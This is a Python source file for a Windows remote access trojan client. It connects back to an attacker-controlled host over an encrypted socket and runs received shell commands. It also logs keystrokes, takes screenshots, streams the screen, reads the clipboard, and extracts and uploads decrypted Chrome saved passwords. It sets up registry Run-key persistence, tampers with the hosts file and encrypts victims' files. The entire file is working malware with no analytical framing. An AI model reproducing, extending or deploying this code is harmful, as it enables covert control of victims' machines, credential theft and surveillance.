import socket
import json
import subprocess
import time
import ctypes
import os
import keylogger
import threading
import shutil
import sys
import sqlite3
import base64
import win32crypt
from elevated import elevatedcheck
from weakcheck import *
from getinfo import *
from config import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad ,unpad
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
from PIL import ImageGrab, Image
from io import BytesIO
from vidstream import ScreenShareClient
import win32clipboard

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def reliable_send(data):
    data = base64.b64encode(encryptcon(data.encode("utf-8"))).decode("utf-8")
    sjson = json.dumps(data)
    s.send(sjson.encode())

def encryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    padded = pad(message, AES.block_size)
    return aes.encrypt(padded)

def decryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    decrypt = aes.decrypt(message)
    unpadded = unpad(decrypt, AES.block_size)
    return(unpadded)

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(8096).decode().rstrip()
            return decryptcon(base64.b64decode(json.loads(data))).decode("utf-8")
        except ValueError:
            continue

def encrypt(infile,  key):
    if os.path.exists(infile) == False:
        reliable_send("file does not exist")
    else:
        try:
            f = Fernet(key)
            with open(infile, "rb") as i:
                file_data = i.read()
                encrypted_data = f.encrypt(file_data)
                i.close()
            with open(infile, "wb") as out:
                out.write(encrypted_data)
                i.close()
            reliable_send("file encrypted")
        except:
            reliable_send("It can only encrypt one file not a whole directory")
    shell()

def decrypt(filename, key):
    if os.path.exists(filename) == False:
        reliable_send("file does not exist")
    else:
        try:
            f = Fernet(key)
            with open(filename, "rb") as i:
                encrypted_data = i.read()
                i.close()
            decrypted_data = f.decrypt(encrypted_data)
            with open(filename, "wb") as out:
                out.write(decrypted_data)
                out.close()
            reliable_send("file decrypted")
        except:
            reliable_send(f"It can only encrypt one file not a whole directory")
    shell()

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(8096)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(8096)
        except socket.timeout:
            break
    s.settimeout(None)
    f.close()


def blockwebsite():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            redirect = redirect_ip
            website_list = target_web
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                content = f.read()
                for website in website_list:
                    if website in content:
                        pass
                    else:
                        f.write(redirect + " " + website + "\n")
                f.close()
            reliable_send(f"operation succeeded, {website_list} has been blocked")
        except:
            reliable_send("operation failed")
    shell()

def unblockweb():
    if check() == "No admin privilege":
        reliable_send("this module requires admin privilege")
    else:
        try:
            with open("C:\Windows\System32\drivers\etc\hosts", 'r+') as f:
                f.truncate(0)
                f.close()
                reliable_send("all websites have been unblocked")
        except:
            reliable_send("operation failed")
    shell()

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def start_screenshare():
    try:
        client = ScreenShareClient(lhost, sport)
        client.start_stream()
        reliable_send("screenshare started")
    except Exception as e:
        reliable_send(e.output)

def screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[+] Error Creating Persistence With The Target Machine')

def clipboard():
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
    win32clipboard.CloseClipboard()
    reliable_send(data.decode("utf-8"))

def display(link):
    try:
        response = requests.get(link)
        img = Image.open(BytesIO(response.content))
        img.show()
        reliable_send("image displayed")
    except:
        reliable_send("Could not display image")

def connection():
    while True:
        try:
            time.sleep(3)
            s.connect((lhost, lport))
            shell()
            s.close()
            break
        except:
            connection()


def check():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        return("Have admin privilege!!!")
    else:
        return("No admin privilege")

def checkp():
    substring = "Record Name"
    result2 = []
    execute = subprocess.Popen("ipconfig /displaydns", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    result = (execute.stdout.read() + execute.stderr.read()).decode()
    split = result.splitlines()
    for i in split:
        if substring in i:
            web = i.split(":")[1].replace(" ", "")
            if web in porn and web not in result2:
                result2.append(web)
            else:
                pass
        else:
            pass

    if len(result2) == 0:
        try:
            reliable_send("No porn sites detected")
        except:
            pass
    else:
        fresult = (' ,'.join(result2) + " has been detected")
        try:
            reliable_send(fresult)
        except:
            pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def chrome():
    try:
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        file_object = open("log.txt", 'a')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                file_object.write(f"Origin URL: {origin_url}\n")
                file_object.write(f"Action URL: {action_url}\n")
                file_object.write(f"Username: {username}\n")
                file_object.write(f"Password: {password}\n")
            else:
                continue
            if date_created != 86400000000 and date_created:
                file_object.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
            if date_last_used != 86400000000 and date_last_used:
                file_object.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
                file_object.write("=" * 50 + "\n")

        file_object.close()
        cursor.close()
        db.close()
        upload_file("log.txt")
        os.remove("log.txt")
        os.remove(filename)
        shell()
    except:
        shell()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background' or command == "help" or command == "clear" or command == "cls":
            pass
        elif command[:3] == 'cd ':
            try:
                os.chdir(command[3:])
            except:
                pass
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screenshot.png')
            os.remove('screenshot.png')
        elif command == 'keylog_start':
            keylog = keylogger.Keylogger()
            t = threading.Thread(target=keylog.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command == 'keylog_dump':
            keylog = keylogger.Keylogger()
            logs = keylog.read_logs()
            reliable_send(logs)
        elif command == 'keylog_stop':
            keylog = keylogger.Keylogger()
            keylog.self_destruct()
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command == "chromegrab":
            chrome()
            os.remove('ChromeData.db')
        elif command == "checkpriv":
            reliable_send(check())
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        elif command == "checkporn":
            checkp()
        elif command == "blocksite":
            blockwebsite()
        elif command == "unblocksite":
            unblockweb()
        elif command == "getinfo":
            reliable_send(getall())
        elif command == "weakservice":
            output = weak()
            reliable_send(output)
        elif command == "start_stream":
            start_screenshare()
        elif command == "check_elevated":
            output = elevatedcheck()
            reliable_send(output)
        elif command == "encrypt":
            key = reliable_recv()
            filepath = reliable_recv()
            if filepath == "exit":
                shell()
            else:
                try:
                    raw_s = (r'{}'.format(filepath))
                    raw_k = (key.encode('utf-8'))
                except:
                    reliable_send("convertion error")
                    shell()
                try:
                    encrypt(infile=raw_s, key=raw_k)
                except:
                    reliable_send("error")
            shell()
        elif command == "clipcopy":
            clipboard()
        elif command[:7] == "display":
            try:
                link = command[8:]
                display(link)
            except:
                reliable_send("failed")
        elif command == "decrypt":
            key2 = reliable_recv()
            filepath2 = reliable_recv()
            if filepath2 == "exit":
                shell()
            else:
                raw_s2 = (r'{}'.format(filepath2))
                raw_k2 = (key2.encode('utf-8'))
                try:
                    decrypt(filename=raw_s2, key=raw_k2)
                except:
                    reliable_send("error")
            shell()
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
connection()
#do not delete this comment
